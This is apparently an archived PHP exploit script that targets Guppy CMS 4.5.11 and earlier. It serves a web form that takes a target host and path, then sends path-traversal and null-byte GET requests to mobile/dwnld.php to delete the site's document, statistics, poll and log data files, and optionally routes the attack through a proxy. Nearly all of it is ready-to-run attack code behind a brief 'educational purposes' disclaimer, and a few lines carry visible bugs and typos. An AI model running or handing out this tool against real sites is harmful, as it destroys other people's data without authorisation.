Guppy <= 4.5.11 (Delete Databases) Remote Denial of Service Exploit
===================================================================




# Change line 30 s/htp/http if you would like to see the logo. /str0ke

<?php
#                    Guppy <= 4.5.11 Remote DOS Exploit                       #
#                               by trueend5                                   #
#             Computer Security Science Researchers Institute                 #
#                           [http://www.KAPDA.ir]                             #
#                                                                             #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 5);
ob_implicit_flush (1);

echo&#039;<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Guppy <= 4.5.11 Remote DOS Exploit</title>
</head>

<body bgcolor="#FFCCFF">

<p align="center"><font size="4" color="#0000FF">Guppy <= 4.5.11 Remote DOS
Exploit</font></p>
<p class="Stile6" align="center"><font size="3" color="#FF0000">by trueend5</font></p>
<p align="center"><font size="4" color="#008000">Computer Security Science Researchers
Institute</font></p>
<font SIZE="3">
<p align="center"><a href="http://www.kapda.ir">KAPDA</a></p>
<p align="center"><img border="0" src="http://irannetjob.com/pics/ph-logo.png" width="120" height="121"></p>
</font>
<table width="90%">
  <tbody>
    <tr>
      <td width="43%" align="left">
        <form name="form1" action="&#039;.$SERVER[PHP_SELF].&#039;" method="post">
          <p><input name="host" size="20"> <span class="Stile5"><font color="#FF0000">*</font> hostname (ex:www.sitename.com)</span></p>
          <p><input name="path" size="20"> <span class="Stile5"><font color="#FF0000">*</font> path (ex:
          /guppy/
          or just / )</span></p>
          <p><input name="num" size="20"> <span class="Stile5">how many document
          do you want to destroy (default is 100)</span></p>
          <p>&nbps; This option works when magic_quotes_gpc is Off</p>
          <p><input name="port" size="20"><span class="Stile5">specify a port&nbps;
          (default is 80)</span></p>
          <p><input name="proxy" size="20"><span class="Stile5">send exploit
          through an HTTP proxy (ip:port)</span></p>
          <p align="center"> <span class="Stile5"><font color="#FF0000">&nbps;&nbps;
          * </font>fields are required</span></p>
          <p align="center"><span class="Stile5">-----------------------------------------------------------------------------------------------</span></p>
          
          <p><input type="submit" value="Start" name="Submit"></p>
        </form>
      </td>
    </tr>
  </tbody>
</table>
</body></html>&#039;;
function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo &#039;<table border="0"><tr>&#039;;
  while ($ii <= strlen($headeri)-1){
    $datai=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo "<td>&nbps;&nbps;</td>";
      for ($li=0; $li<=15; $li++) {
        echo "<td>".$headeri[$li+$ki]."</td>";
		}
      $ki=$ki+16;
      echo "</tr><tr>";
    }
    if (strlen($datai)==1) {
      echo "<td>0".$datai."</td>";
    }
    else {
      echo "<td>".$datai."</td> ";
    }
    $ii++;$ji++;
  }
  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo "<td>&nbsp&nbsp</td>";
  }
  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
    echo "<td>".$headeri[$li]."</td>";
  }
  echo "</tr></table>";
}

$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;

function sendpacket() 
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
  }
  else {
    if (!$c) {echo &#039;Not a valid proxy&#039;;
    die;
    }
  echo "OK.<br>";
  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
  if ($proxy==&#039;&#039;) {
    $result = socket_connect($socket, $host, $port);
  }
  else {
    $parts =explode(&#039;:&#039;,$proxy);
    echo &#039;Connecting to &#039;.$parts[0].&#039;:&#039;.$parts[1].&#039; proxy...<br>&#039;;
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result < 0) {
    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
  }
  else {
    echo "OK.<br><br>";
    $html= &#039;&#039;;
    socket_write($socket, $packet, strlen($packet));
    echo "Reading response:<br>";
    while ($out= socket_read($socket, 2048)) {$html.=$out;}
    echo nl2br(htmlentities($html));
    echo "Closing socket...";
    socket_close($socket);
  }
  }
}

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.htmlentities($host); die;
    }
  }
  else {
    if (!$c) {
      echo &#039;Not a valid proxy&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &#039;Connecting to &#039;.$parts[0].&#039;:&#039;.$parts[1].&#039; proxy...<br>&#039;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$_POST[host];
$path=$_POST[path];
$port=$_POST[port];
$num=$_POST[num];

if (($host<>&#039;&#039;) and ($path<>&#039;&#039;))
{
  $port=intval(trim($port));
  $num=intval(trim($num));
  if ($port==&#039;&#039;) {$port=80;}
  if ($num==&#039;&#039;) {$num=100;}
  if (($path[0]<>&#039;/&#039;) or ($path[strlen($path)-1]<>&#039;/&#039;)) {die(&#039;Error... check the path!&#039;);}
  if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}
  $host=str_replace("\r\n","",$host);
  $path=str_replace("\r\n","",$path);
  echo &#039; Try to see if magic_quotes_gpc is enable! ...&#039;;
  $packet="GET ".$p."mobile/dwnld.php?pg=./%2E./test.inc%00"." HTTP/1.1\r\n";
  $packet.="User-Agent: Shareaza v1.x.x.xx\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  show($packet);
  sendpacketii($packet);
  $test=&#039;http://&#039;.$host.$path.&#039;data/test.inc&#039;;
  if (!include("$test")) {
  echo&#039;It seems magic_quotes_gpc is On. Trying STEP 2 ...&#039;;
}
  else {echo&#039;magic_quotes_gpc is disable. STEP 1:&#039;;
  for ($n = 1; $n <= $num; $n++) {
  $packet="GET ".$p."mobile/dwnld.php?pg=./%2E./doc".$n.".inc%00"." HTTP/1.1\r\n";
  $packet.="User-Agent: Shareaza v1.x.x.xx\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  show($packet);
  sendpacketii($packet);
  }
}
  echo&#039; STEP 2:&#039;;
  for ($n = 1; $n <= 29; $n++) {
  if ($n==1) {$str=&#039;ar&#039;;} if ($n==2) {$str=&#039;counter&#039;;} if ($n==3) {$str=&#039;dn&#039;;} if ($n==4) {$str=&#039;docid&#039;;} if ($n==5) {$str=&#039;fa&#039;;}
  if ($n==6) {$str=&#039;fr&#039;;} if ($n==7) {$str=&#039;frcat&#039;;} if ($n==8) {$str=&#039;frcount&#039;;} if ($n==9) {$str=&#039;frth&#039;;} if ($n==10) {$str=&#039;ippoll&#039;;}
  if ($n==11) {$str=&#039;ipstats&#039;;} if ($n==12) {$str=&#039;li&#039;;} if ($n==13) {$str=&#039;log_date&#039;;} if ($n==14) {$str=&#039;log_files&#039;;}
  if ($n==15) {$str=&#039;log_stats&#039;;} if ($n==16) {$str=&#039;logbook&#039;;} if ($n==17) {$str=&#039;logd&#039;;} if ($n==18) {$str=&#039;logh&#039;;}
  if ($n==19) {$str=&#039;logm&#039;;} if ($n==20) {$str=&#039;logp&#039;;} if ($n==21) {$str=&#039;logy&#039;;} if ($n==22) {$str=&#039;nextid&#039;;}
  if ($n==23) {$str=&#039;nwlist&#039;;} if ($n==24) {$str=&#039;ph&#039;;} if ($n==25) {$str=&#039;poll&#039;;} if ($n==26) {$str=&#039;ra&#039;;}
  if ($n==27) {$str=&#039;rs&#039;;} if ($n==28) {$str=&#039;stats&#039;;} if ($n==29) {$str=&#039;statsbk&#039;;}
  $packet="GET ".$p."mobile/dwnld.php?pg=./%2E./$str"." HTTP/1.1\r\n";
  $packet.="User-Agent: SnoopRob/x.x\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  show($packet);
  sendpacketii($packet);
  }
  $test2=&#039;http://&#039;.$host.$path.&#039;data/stats.dtb&#039;;
  include("$test2");
  if (eregi("1",$html)) {echo "Exploit succeeded"; }
                           else {echo "Exploit failed...";}
}
else
{echo "IMPORTANT NOTICE: This POC is just for educational purposes, Please Do not use it against external websites<br>
You are responsible for any damage that .... ";}

?>



